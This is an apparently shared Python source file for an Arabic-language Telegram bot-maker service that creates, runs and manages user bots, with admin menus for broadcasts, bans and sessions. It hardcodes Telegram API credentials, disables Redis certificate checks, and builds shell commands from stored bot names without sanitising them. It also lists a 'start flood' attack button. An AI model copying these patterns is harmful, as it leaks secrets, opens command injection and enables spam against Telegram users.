# © VEGA — Intellectual Property Rights

# Respect for Copyright and Content Protection

# In this project, we are committed to respecting community laws, protecting intellectual property rights, and appreciating the efforts of all creators and content owners.

# "All rights are reserved to their original owners, and this project does not constitute a waiver of any intellectual property rights belonging to other parties.

# © VEGA — All rights related to this project are reserved to their owners."

# Supporting Creators is a Responsibility

# - Creativity is the fruit of effort that deserves appreciation and respect.
# - Protecting copyright contributes to building a more just digital community.
# - Usage licenses and redistribution terms must be respected.
# - We reject unauthorized use of any content protected by copyright.

# Responsible Use Pledge

# By using this project, you pledge to respect intellectual property rights and not to copy or redistribute any protected content without obtaining the necessary permission or license.

# Be a partner in protecting creativity, and do not be a cause of rights violations.

# © VEGA | By: @TopVeGa All Rights Reserved



import os
import sys
import asyncio
import re
import shutil
import psutil
import glob
import random
import requests
import platform
import uuid
import socket
import subprocess
import secrets
import string
import time
import threading
import pytz
import ssl
import json
import html
import aiohttp
import io
from collections import defaultdict
from asyncio import sleep
from datetime import datetime, timedelta, timezone
from zoneinfo import ZoneInfo

from pyrogram import Client, filters, StopPropagation
from pyrogram import types
from pyrogram import enums
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid,
    PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid,
    PeerIdInvalid, FloodWait, MessageNotModified,
)
from pyrogram.raw import functions
from pyrogram.enums import ParseMode
from pyrogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton,
    Message, InputMediaPhoto,
)
from pyrogram.errors import *
from pyrogram.enums import ParseMode, ButtonStyle
from pyrogram.types import Message, RichMessageButton, CallbackQuery
from bot import bot, bot_id, BOT_TOKEN
from redis import Redis
from sys import version as pyver
from pyrogram import __version__ as pyrover
from pytgcalls.__version__ import __version__ as pytgver

from os import execle, environ
from redis import Redis
from typing import Dict, List, Union, Callable, Any

from bot import bot, bot_id

API_ID = 8186557
API_HASH = "efd77b34c69c164ce158037ff5a0d117"
OFF = False
Bots = []
ADMINS = []
SUDOS = [481322119]
Channel = "vegaone"
Channel_Name = "فيجا | SOUND"
channels_one = ["@vegaone", "@Python2015", "@eS_I_M", "@GroupNIx", "@foundervega"]
Link = "https://files.catbox.moe/qkj2yd.mp4"
Link2 = "https://telegra.ph/file/28aade07d7335be175ddb.mp4"

REDIS_URL = os.environ.get("REDIS_URL", "..........")
redis_client = Redis.from_url(REDIS_URL, decode_responses=True, ssl_cert_reqs=ssl.CERT_NONE)

blocked = []
mk = []

def r_sadd(key, value): redis_client.sadd(key, value)
def r_srem(key, value): redis_client.srem(key, value)
def r_smembers(key): return redis_client.smembers(key)
def r_delete(key): redis_client.delete(key)
def r_set(key, value): redis_client.set(key, value)
def r_get(key): return redis_client.get(key)
def r_exists(key): return redis_client.exists(key)
def r_keys(pattern): return redis_client.keys(pattern)
def r_delete_pattern(pattern):
    keys = redis_client.keys(pattern)
    if keys: redis_client.delete(*keys)

def safe_mention(user) -> str:
    first_name = getattr(user, "first_name", None) or "مستخدم"
    return f'<a href="tg://user?id={user.id}">{first_name}</a>'

session_storage = {}
user_states: Dict[int, str] = {}
user_data: Dict[int, Dict[str, Any]] = {}

BROADCAST_TYPES = {
    "normal": f":broadcast:{bot_id}",
    "forward": f":fbroadcast:{bot_id}",
    "pin": f":pinbroadcast:{bot_id}"
}

def add_new_user(user_id: int) -> None:
    key = f"users:{bot_id}"
    if not is_user(user_id): r_sadd(key, user_id)

def is_user(user_id: int) -> bool:
    try: return redis_client.sismember(f"users:{bot_id}", user_id)
    except: return False

def get_users() -> list:
    try:
        users = r_smembers(f"users:{bot_id}")
        return [int(user) for user in users] if users else []
    except: return []

def users_backup() -> str:
    users = "\n".join(str(user) for user in get_users())
    with open("users.txt", "w+") as f: f.write(users)
    return "users.txt"

def del_user(user_id: int) -> bool:
    result = r_srem(f"users:{bot_id}", user_id)
    return result > 0

def clear_other_broadcasts(user_id: int, current_type: str):
    for key, value in BROADCAST_TYPES.items():
        if key != current_type: r_delete(f"{user_id}{value}")

def safe_screen_name(username: str) -> str:
    return re.sub(r"[^A-Za-z0-9_]", "_", username.replace("@", ""))

def is_bot_running(bot_username: str) -> bool:
    try:
        name = safe_screen_name(bot_username)
        return f".{name}\t(" in subprocess.getoutput("screen -ls")
    except: return False

def stop_bot_process(bot_username: str) -> bool:
    try:
        name = safe_screen_name(bot_username)
        result = subprocess.getoutput("screen -ls")
        if name in result:
            subprocess.run(["screen", "-XS", name, "quit"], check=False)
            time.sleep(2)
        still_running = subprocess.getoutput(f"pgrep -f 'plugins.*{name}' || pgrep -f 'python3 -m plugins.*{name}'")
        if still_running.strip():
            subprocess.run(f"pkill -9 -f 'plugins.*{name}'", shell=True, check=False)
            subprocess.run(f"pkill -9 -f 'python3 -m plugins.*{name}'", shell=True, check=False)
            time.sleep(1)
        final_check = subprocess.getoutput(f"screen -ls | grep '{name}'")
        if name in final_check: return False
        return True
    except: return False

def start_bot_process(bot_username: str) -> bool:
    try:
        path = f"Maked/{bot_username}"
        if not os.path.exists(path): return False
        name = safe_screen_name(bot_username)
        subprocess.run(["screen", "-d", "-m", "-S", name, "python3", "-m", "plugins"], cwd=path, check=False)
        return True
    except: return False

def delete_bot_and_keys(bot_username: str) -> bool:
    try:
        stop_bot_process(bot_username)
        bot_path = f"Maked/{bot_username}"
        if os.path.exists(bot_path): shutil.rmtree(bot_path, ignore_errors=True)
        redis_client.hdel(f"bots:{bot_id}", bot_username)
        global Bots
        Bots[:] = [b for b in Bots if b[0] != bot_username]
        return True
    except: return False

def Onee():
    Bots.clear()
    bots_data = redis_client.hgetall(f"bots:{bot_id}")
    for bot_username, dev_id in bots_data.items():
        try:
            bot_info = [bot_username, int(dev_id)]
            Bots.append(bot_info)
            name = safe_screen_name(bot_info[0])
            os.system(f"screen -XS {name} quit")
            os.system(f"cd Maked/{bot_info[0]} && screen -d -m -S {name} python3 -m plugins")
        except: pass
    for user in r_smembers(f"blocked:{bot_id}"):
        try: blocked.append(int(user))
        except: pass
    for chat in r_smembers(f"chats:{bot_id}"):
        try: mk.append(int(chat))
        except: pass

Onee()

_membership_cache: Dict[int, tuple] = {}
MEMBERSHIP_CACHE_TTL = 300
_MEMBERSHIP_NEGATIVE_TTL = 60

async def check_membership_cached(client, user_id: int) -> bool:
    if user_id in SUDOS or user_id in ADMINS: return True
    now = time.time()
    cached = _membership_cache.get(user_id)
    if cached:
        is_member, ts = cached
        ttl = MEMBERSHIP_CACHE_TTL if is_member else _MEMBERSHIP_NEGATIVE_TTL
        if now - ts < ttl: return is_member
    try:
        member = await client.get_chat_member(Channel, user_id)
        is_member = member.status not in (enums.ChatMemberStatus.LEFT, enums.ChatMemberStatus.BANNED)
    except FloodWait:
        is_member = cached[0] if cached else True
        _membership_cache[user_id] = (is_member, now)
        return is_member
    except: is_member = True
    _membership_cache[user_id] = (is_member, now)
    return is_member

def RBtn(text: str, cb: str = None, style=None, url: str = None):
    if bool(url) == bool(cb): raise ValueError("يجب تحديد callback_data أو url")
    if cb is not None: return RichMessageButton(text=str(text), callback_data=str(cb), style=style)
    return RichMessageButton(text=str(text), url=str(url), style=style)

def text_block(text: str): return {"type": "text", "text": text}
def btn_row(buttons, center=True): return {"type": "buttons", "buttons": list(buttons), "center": center}

def _style_to_str(style) -> str:
    if style is None: return "primary"
    s = str(style).lower()
    if "success" in s: return "success"
    if "danger" in s: return "danger"
    return "primary"

async def send_rich(chat_id, blocks, reply_to=None, edit_message_id=None):
    text_parts, button_rows_html = [], ""
    for block in blocks:
        if isinstance(block, dict):
            if block.get("type") == "text":
                text_parts.append(str(block.get("text", "")).replace("\n", "<br/>"))
            elif block.get("type") == "buttons":
                btn_tags = []
                for btn in block.get("buttons", []):
                    label = html.escape(str(getattr(btn, "text", "")), quote=False)
                    style = _style_to_str(getattr(btn, "style", None))
                    cb_data, b_url = getattr(btn, "callback_data", None), getattr(btn, "url", None)
                    if cb_data is not None:
                        btn_tags.append(f'<tg-button type="callback_data" style="{style}" data="{html.escape(str(cb_data), quote=True)}">{label}</tg-button>')
                    elif b_url:
                        btn_tags.append(f'<tg-button type="url" style="{style}" url="{html.escape(str(b_url), quote=True)}">{label}</tg-button>')
                if btn_tags:
                    align = "center" if block.get("center", True) else "left"
                    button_rows_html += f'<tg-button-row align="{align}">{"".join(btn_tags)}</tg-button-row>'
                    
    full_html = "".join(text_parts) + button_rows_html
    if not full_html.strip(): full_html = "ㅤ"
    
    reply_id = reply_to.id if hasattr(reply_to, "id") else reply_to
    payload = {"chat_id": chat_id, "rich_message": {"html": full_html, "is_rtl": True}}
    method = "sendRichMessage"
    
    if edit_message_id:
        payload["message_id"] = edit_message_id
        method = "editMessageText"
    elif reply_id:
        payload["reply_parameters"] = {"message_id": reply_id}
        
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload) as resp:
                res = await resp.json(content_type=None)
                if res.get("ok"): return res.get("result")
                print(f"[send_rich] فشل {method}: {res.get('description')}")
                return None
    except Exception as e:
        print(f"[send_rich] استثناء: {e}")
        return None

async def safe_answer(query, text=None, alert=False):
    try: await query.answer(text, show_alert=alert)
    except: pass

def _blocks_to_kb_and_text(blocks):
    text_parts, rows = [], []
    for block in blocks:
        if not isinstance(block, dict): continue
        if block.get("type") == "text": text_parts.append(str(block.get("text", "")))
        elif block.get("type") == "buttons":
            row_btns = []
            for btn in block.get("buttons", []):
                cb, url, label = getattr(btn, "callback_data", None), getattr(btn, "url", None), getattr(btn, "text", "")
                if cb is not None: row_btns.append(InlineKeyboardButton(text=label, callback_data=str(cb)))
                elif url: row_btns.append(InlineKeyboardButton(text=label, url=str(url)))
            if row_btns: rows.append(row_btns)
    return ("\n".join(text_parts) if text_parts else "ㅤ", InlineKeyboardMarkup(rows) if rows else None)

async def safe_send_rich(client, chat_id, blocks, reply_to=None):
    res = await send_rich(chat_id=chat_id, blocks=blocks, reply_to=reply_to)
    if res: return res
    try:
        text, kb = _blocks_to_kb_and_text(blocks)
        return await client.send_message(chat_id=chat_id, text=text, reply_markup=kb, parse_mode=ParseMode.HTML)
    except: return None

async def _safe_edit(query, blocks_or_text, kb=None):
    if isinstance(blocks_or_text, list): blocks = blocks_or_text
    else:
        text = str(blocks_or_text)
        blocks = [text_block(text)]
        if kb is not None:
            for row in kb.inline_keyboard: blocks.append(btn_row(row))
    try:
        res = await send_rich(chat_id=query.message.chat.id, blocks=blocks, edit_message_id=query.message.id)
        if res: return res
    except: pass
    try:
        fallback_text, fallback_kb = _blocks_to_kb_and_text(blocks)
        if query.message.caption is not None or query.message.photo or query.message.video:
            return await query.message.edit_caption(caption=fallback_text, reply_markup=fallback_kb, parse_mode=ParseMode.HTML)
        return await query.message.edit_text(fallback_text, reply_markup=fallback_kb, parse_mode=ParseMode.HTML)
    except: return None

def set_state(user_id: int, state: str, menu_message_id: int = None, **kwargs):
    user_states[user_id] = state
    d = user_data.setdefault(user_id, {})
    if menu_message_id: d["menu_message_id"] = menu_message_id
    d.update(kwargs)

def clear_state(user_id: int):
    user_states.pop(user_id, None)
    user_data.pop(user_id, None)

def get_state(user_id: int): return user_states.get(user_id)
def get_menu_msg_id(user_id: int): return user_data.get(user_id, {}).get("menu_message_id")

def main_menu_blocks(is_admin: bool = False, user=None):
    blocks = []
    if is_admin:
        rows = [
            [RBtn("قسم البوتات", "menu_bots", ButtonStyle.PRIMARY), RBtn("قسم الإحصائيات", "menu_stats", ButtonStyle.SUCCESS)],
            [RBtn("قسم الجلسات", "menu_sessions", ButtonStyle.PRIMARY)],
            [RBtn("قسم الإذاعة", "menu_broadcast", ButtonStyle.DANGER), RBtn("قسم المطورين", "menu_admins", ButtonStyle.SUCCESS)],
            [RBtn("قسم الإعدادات", "menu_settings", ButtonStyle.PRIMARY), RBtn("قسم العملات", "menu_coins", ButtonStyle.SUCCESS)],
            [RBtn("قسم المعلومات", "menu_info", ButtonStyle.PRIMARY), RBtn("معلومات و خدمات", "menu_services", ButtonStyle.SUCCESS)],
        ]
    else:
        user_link = safe_mention(user) if user else "عزيزي"
        blocks.append(text_block(f"<b>•  مرحباً بك :</b> {user_link}\n\n<b>اختر من القائمة أدناه</b>"))
        rows = [
            [RBtn("صنع بوت", "make_bot", ButtonStyle.SUCCESS), RBtn("حذف بوت", "delete_bot", ButtonStyle.DANGER)],
            [RBtn("تغير الجلسة", "change_session", ButtonStyle.PRIMARY)],
        ]
    for r in rows: blocks.append(btn_row(r))
    return blocks

def back_blocks(target: str = "main", title: str = None):
    blocks = []
    if title: blocks.append(text_block(title))
    blocks.append(btn_row([RBtn("رجوع", f"back_{target}", ButtonStyle.DANGER)]))
    return blocks

def bots_section_blocks(title: str = "قسم البوتات"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("صنع بوت", "make_bot", ButtonStyle.SUCCESS), RBtn("حذف بوت", "delete_bot", ButtonStyle.DANGER)]),
        btn_row([RBtn("البوتات المصنوعه", "list_bots", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("ايقاف البوت", "stop_bot", ButtonStyle.DANGER), RBtn("تشغيل البوت", "start_bot", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("ايقاف البوتات", "stop_all_bots", ButtonStyle.DANGER), RBtn("تشغيل البوتات", "start_all_bots", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("تحديث البوتات", "update_bots", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("حذف البوتات", "delete_all_bots", ButtonStyle.DANGER)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

def stats_section_blocks(title: str = "قسم الإحصائيات"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("فحص البوتات", "check_bots", ButtonStyle.PRIMARY), RBtn("احصائيات البوتات", "bots_stats", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("تصفيه البوتات", "filter_bots", ButtonStyle.DANGER), RBtn("الاحصائيات", "global_stats", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

def sessions_section_blocks(title: str = "قسم الجلسات"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("رشق استارت", "start_attack", ButtonStyle.DANGER), RBtn("تغير الجلسة", "change_session", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("حذف حساب", "delete_account", ButtonStyle.DANGER)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

def broadcast_section_blocks(title: str = "قسم الإذاعة"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("اذاعه", "broadcast_normal", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("اذاعه بالتثبيت", "broadcast_pin", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("اذاعه بالتوجيه", "broadcast_forward", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

def admins_section_blocks(title: str = "قسم المطورين"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("رفع ادمن", "promote_admin", ButtonStyle.SUCCESS), RBtn("تنزيل ادمن", "demote_admin", ButtonStyle.DANGER)]),
        btn_row([RBtn("الادمنيه", "list_admins", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("حظر", "ban_user", ButtonStyle.DANGER), RBtn("الغاء حظر", "unban_user", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("صلاحياتي", "my_perms", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("المحظورين", "list_blocked", ButtonStyle.DANGER), RBtn("مسح المحظورين", "clear_blocked", ButtonStyle.DANGER)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

def settings_section_blocks(title: str = "قسم الإعدادات"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("فتح النظام", "open_system", ButtonStyle.SUCCESS), RBtn("قفل النظام", "close_system", ButtonStyle.DANGER)]),
        btn_row([RBtn("تحديث النظام", "update_system", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("تفعيل التواصل", "enable_comm", ButtonStyle.SUCCESS), RBtn("تعطيل التواصل", "disable_comm", ButtonStyle.DANGER)]),
        btn_row([RBtn("جلب نسخه", "backup_users", ButtonStyle.PRIMARY), RBtn("رفع نسخه", "upload_users", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("تفريغ التخزين", "clear_storage", ButtonStyle.DANGER)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

def info_section_blocks(title: str = "قسم المعلومات"):
    return [
        text_block(f"<b>انت الان في: {title}</b>"),
        btn_row([RBtn("معلومات النظام", "system_info", ButtonStyle.PRIMARY), RBtn("معلومات التنصيب", "install_info", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("معلومات السيرفر", "server_info", ButtonStyle.PRIMARY)]),
        btn_row([RBtn("الاسكرينات المفتوحه", "list_screens", ButtonStyle.SUCCESS)]),
        btn_row([RBtn("رجوع", "back_main", ButtonStyle.DANGER)]),
    ]

@Client.on_message(filters.private, group=-200)
async def me(client, message):
    if message.chat.id not in mk:
        mk.append(message.chat.id)
        r_sadd(f"chats:{bot_id}", message.chat.id)
        
    if message.chat.id in blocked: 
        await message.reply_text("تم حظرك عام من فيجا")
        raise StopPropagation
        
    if message.text and message.text.startswith("/start"):
        if OFF and message.from_user.id not in SUDOS and message.from_user.id not in ADMINS:
            await message.reply_text(
                f"النظام مكتمل قم بالاشتراك في باقه شهريه\n"
                f"للاشتراك تواصل مع :  @TopVeGa"
            )
            raise StopPropagation
            
    if not get_state(message.from_user.id):
        is_member = await check_membership_cached(client, message.from_user.id)
        if not is_member:
            user_link = safe_mention(message.from_user)
            blocks = [
                text_block(f"<b>مرحبا :{user_link}\n\nعليك بالاشتراك اولا في قناه فيجا\nتم تطويري من قبل : @TopVeGa</b>"),
                btn_row([RBtn(Channel_Name, url=f"https://t.me/{Channel}", style=ButtonStyle.PRIMARY)])
            ]
            await safe_send_rich(client, message.chat.id, blocks, reply_to=message.id)
            raise StopPropagation
            
    message.continue_propagation()

@bot.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user_id = message.from_user.id
    
    if not is_user(user_id):
        add_new_user(user_id)
        user_link = safe_mention(message.from_user)
        text = (
            f"دخل عضو جديد لـ {Channel_Name}\n\n"
            f"الاسم : {user_link}\n"
            f"معرف : @{message.from_user.username or 'لا يوجد'}\n"
            f"الايدي : {user_id}\n\n"
            f"عدد الاعضاء: {len(get_users())}"
        )
        admins = set((SUDOS or []) + (ADMINS or []))
        for admin_id in admins:
            try: await client.send_message(int(admin_id), text)
            except: pass

    clear_state(user_id)
    is_admin = user_id in SUDOS or user_id in ADMINS
    blocks = main_menu_blocks(is_admin, message.from_user)
    await safe_send_rich(client, message.chat.id, blocks, reply_to=message.id)

@Client.on_callback_query(filters.regex(r"^back_"))
async def cb_back(client, query):
    target = query.data.replace("back_", "")
    is_admin = query.from_user.id in SUDOS or query.from_user.id in ADMINS
    clear_state(query.from_user.id)
    if target == "main": await _safe_edit(query, main_menu_blocks(is_admin, query.from_user))
    elif target == "bots" and is_admin: await _safe_edit(query, bots_section_blocks())
    elif target == "stats" and is_admin: await _safe_edit(query, stats_section_blocks())
    elif target == "sessions" and is_admin: await _safe_edit(query, sessions_section_blocks())
    elif target == "broadcast" and is_admin: await _safe_edit(query, broadcast_section_blocks())
    elif target == "admins" and is_admin: await _safe_edit(query, admins_section_blocks())
    elif target == "settings" and is_admin: await _safe_edit(query, settings_section_blocks())
    elif target == "info" and is_admin: await _safe_edit(query, info_section_blocks())
    else: await safe_answer(query, "غير مصرح", alert=True)

@Client.on_callback_query(filters.regex(r"^menu_"))
async def cb_menu(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    section = query.data.replace("menu_", "")
    if section == "bots": await _safe_edit(query, bots_section_blocks())
    elif section == "stats": await _safe_edit(query, stats_section_blocks())
    elif section == "sessions": await _safe_edit(query, sessions_section_blocks())
    elif section == "broadcast": await _safe_edit(query, broadcast_section_blocks())
    elif section == "admins": await _safe_edit(query, admins_section_blocks())
    elif section == "settings": await _safe_edit(query, settings_section_blocks())
    elif section == "info": await _safe_edit(query, info_section_blocks())
    elif section == "coins": await safe_answer(query, "قسم العملات غير متاح حاليا", alert=True)
    elif section == "services": await safe_answer(query, "معلومات و خدمات - قريبا", alert=True)
    else: await safe_answer(query, "خطأ", alert=True)

@Client.on_callback_query(filters.regex("^make_bot$"))
async def cb_make_bot(client, query):
    global OFF
    if OFF and query.from_user.id not in SUDOS:
        return await safe_answer(query, "الصانع مقفول حاليا يرجى التواصل مع المطور @TopVeGa", alert=True)
        
    if query.from_user.id not in SUDOS:
        for x in Bots:
            if int(x[1]) == query.from_user.id: return await safe_answer(query, "لقد قمت بصنع بوت من قبل", alert=True)
    set_state(query.from_user.id, "make_bot_token", menu_message_id=query.message.id, step="token")
    await _safe_edit(query, back_blocks("bots", "<b>أرسل توكن البوت من @BotFather</b>"))

@Client.on_callback_query(filters.regex("^delete_bot$"))
async def cb_delete_bot(client, query):
    global OFF
    if OFF and query.from_user.id not in SUDOS and query.from_user.id not in ADMINS:
        return await safe_answer(query, "الصانع مقفول حاليا يرجى التواصل مع المطور @TopVeGa", alert=True)

    uid = query.from_user.id
    if uid not in SUDOS and uid not in ADMINS:
        for x in Bots:
            if int(x[1]) == uid:
                delete_bot_and_keys(x[0])
                return await _safe_edit(query, back_blocks("main", "تم طرد بوتك من فيجا"))
        return await _safe_edit(query, back_blocks("main", "لم تقم بصنع بوتات"))
    set_state(uid, "delete_bot_username", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("bots", "أرسل معرف البوت لحذفه"))

@Client.on_callback_query(filters.regex("^list_bots$"))
async def cb_list_bots(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    if not Bots: return await _safe_edit(query, back_blocks("bots", "لا يوجد بوتات مخزنة حاليا"))
    async def get_bot_info(bot_username, dev_id):
        try:
            bot_info, dev_info = await asyncio.gather(client.get_users(bot_username), client.get_users(dev_id), return_exceptions=True)
            if isinstance(bot_info, Exception) or isinstance(dev_info, Exception): return f"<b>البوت: @{bot_username} | المطور: {dev_id}</b>"
            return f"<b>البوت: {safe_mention(bot_info)} | المطور: {safe_mention(dev_info)}</b>"
        except: return f"<b>البوت: @{bot_username} | المطور: {dev_id}</b>"
    tasks = [get_bot_info(bot[0], bot[1]) for bot in Bots]
    results = await asyncio.gather(*tasks)
    text = f"<b>──「 قائمة البوتات 」──</b>\n<b>عدد البوتات : {len(Bots)}</b>\n\n" + "\n".join(f"{i}- {res}" for i, res in enumerate(results, 1))
    await _safe_edit(query, back_blocks("bots", text))

@Client.on_callback_query(filters.regex("^start_bot$"))
async def cb_start_bot(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    set_state(query.from_user.id, "start_bot_username", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("bots", "ارسل معرف البوت للتشغيل"))

@Client.on_callback_query(filters.regex("^stop_bot$"))
async def cb_stop_bot(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    set_state(query.from_user.id, "stop_bot_username", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("bots", "ارسل معرف البوت للإيقاف"))

@Client.on_callback_query(filters.regex("^start_all_bots$"))
async def cb_start_all_bots(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    n, already_running = 0, 0
    if not os.path.exists('Maked'): return await _safe_edit(query, back_blocks("bots", "خطأ: لا يوجد مجلد Maked"))
    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder):
            if is_bot_running(folder): already_running += 1; continue
            start_bot_process(folder); n += 1
    if n == 0: await _safe_edit(query, back_blocks("bots", "لا يوجد بوتات لتشغيلها"))
    else: await _safe_edit(query, back_blocks("bots", f"تم تشغيل {n} بوت | {already_running} كانت تعمل مسبقا"))

@Client.on_callback_query(filters.regex("^stop_all_bots$"))
async def cb_stop_all_bots(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    n = 0
    if not os.path.exists('Maked'): return await _safe_edit(query, back_blocks("bots", "خطأ: لا يوجد مجلد Maked"))
    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder): stop_bot_process(folder); n += 1
    if n == 0: await _safe_edit(query, back_blocks("bots", "لا يوجد بوتات لايقافها"))
    else: await _safe_edit(query, back_blocks("bots", f"تم إيقاف {n} بوت"))

@Client.on_callback_query(filters.regex("^update_bots$"))
async def cb_update_bots(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    blocks = [text_block("هل أنت متأكد من أنك تريد تحديث جميع البوتات؟"), btn_row([RBtn("تأكيد", "confirm_updatebots", ButtonStyle.SUCCESS), RBtn("إلغاء", "cancel_update", ButtonStyle.DANGER)]), btn_row([RBtn("رجوع", "back_bots", ButtonStyle.DANGER)])]
    await _safe_edit(query, blocks)

@Client.on_callback_query(filters.regex("^confirm_updatebots$"))
async def cb_confirm_updatebots(client, query):
    await _safe_edit(query, [text_block("▱▱▱▱▱▱▱▱▱▱ 0%")])
    for i in range(10, 110, 10):
        await asyncio.sleep(0.2); await _safe_edit(query, [text_block(f"{'▰'*(i//10)}{'▱'*(10-(i//10))} {i}%")])
    source_path = os.path.join('Make', 'plugins')
    if not os.path.exists(source_path): return await _safe_edit(query, back_blocks("bots", f"خطأ: مجلد التشغيل غير موجود في المسار:\n{source_path}"))
    if not os.path.exists('Maked'): return await _safe_edit(query, back_blocks("bots", " خطأ: مجلد البوتات Maked غير موجود"))
    bots_updated, failed_bots = 0, []
    for bot_folder in os.listdir("Maked"):
        if re.search(r'[Bb][Oo][Tt]', bot_folder, re.IGNORECASE):
            bot_path, target_path = os.path.join('Maked', bot_folder), os.path.join('Maked', bot_folder, 'plugins')
            try:
                stop_bot_process(bot_folder)
                if os.path.exists(target_path): shutil.rmtree(target_path)
                os.makedirs(os.path.dirname(target_path), exist_ok=True); shutil.copytree(source_path, target_path)
                start_bot_process(bot_folder); bots_updated += 1; await asyncio.sleep(1)
            except: failed_bots.append(bot_folder)
    result_message = f"تم تحديث {bots_updated} بوت بنجاح"
    if failed_bots: result_message += f"\nفشل تحديث {len(failed_bots)} بوت"
    await _safe_edit(query, back_blocks("bots", result_message))

@Client.on_callback_query(filters.regex("^cancel_update$"))
async def cb_cancel_update(client, query): await _safe_edit(query, back_blocks("bots", "تم إلغاء العملية"))

@Client.on_callback_query(filters.regex("^delete_all_bots$"))
async def cb_delete_all_bots(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    blocks = [text_block("لتأكيد حذف جميع البوتات اضغط على الزر أدناه:"), btn_row([RBtn("تأكيد الحذف", "confirm_delete_all", ButtonStyle.DANGER)]), btn_row([RBtn("إلغاء", "cancel_delete_all", ButtonStyle.SUCCESS)]), btn_row([RBtn("رجوع", "back_bots", ButtonStyle.DANGER)])]
    await _safe_edit(query, blocks)

@Client.on_callback_query(filters.regex("^confirm_delete_all$"))
async def cb_confirm_delete_all(client, query):
    bot_found = False
    for bot in Bots[:]:
        Bots.remove(bot); redis_client.hdel(f"bots:{bot_id}", bot[0]); bot_found = True
        stop_bot_process(bot[0]); shutil.rmtree(f"Maked/{bot[0]}", ignore_errors=True)
    if bot_found: await _safe_edit(query, back_blocks("bots", "<b>تم حذف جميع البوتات بنجاح</b>"))
    else: await _safe_edit(query, back_blocks("bots", "لم يتم العثور على بوتات لحذفها"))

@Client.on_callback_query(filters.regex("^cancel_delete_all$"))
async def cb_cancel_delete_all(client, query): await _safe_edit(query, back_blocks("bots", "تم إلغاء عملية الحذف"))

@Client.on_callback_query(filters.regex("^global_stats$"))
async def cb_global_stats(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    stats = f"<b>عدد الاعضاء: {len(get_users())}\nعدد مطورين فيجا: {len(SUDOS)}\nعدد الادمن المؤقتين: {len(ADMINS)}</b>"
    await _safe_edit(query, back_blocks("stats", stats))

@Client.on_callback_query(filters.regex("^check_bots$"))
async def cb_check_bots(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "للمطورين فقط", alert=True)
    if not Bots: return await _safe_edit(query, back_blocks("stats", "لا يوجد بوتات"))
    res = "<b>تقرير البوتات:</b>\n\n"
    for bot in Bots:
        if not isinstance(bot, (list, tuple)) or len(bot) < 2: continue
        username, owner_id = bot[0], bot[1]
        users = groups = 0; status = "متوقف"
        try: bot_link = f"<a href='tg://user?id={(await client.get_users(username)).id}'>{username}</a>"
        except: bot_link = f"@{username}"
        try: owner_name = f"<a href='tg://user?id={(await client.get_users(owner_id)).id}'>{(await client.get_users(owner_id)).first_name}</a>"
        except: owner_name = str(owner_id)
        if os.path.exists(f"Maked/{username}"):
            if os.path.exists(f"Maked/{username}/users.txt"):
                with open(f"Maked/{username}/users.txt") as f: users = len(f.readlines())
            if os.path.exists(f"Maked/{username}/groups.txt"):
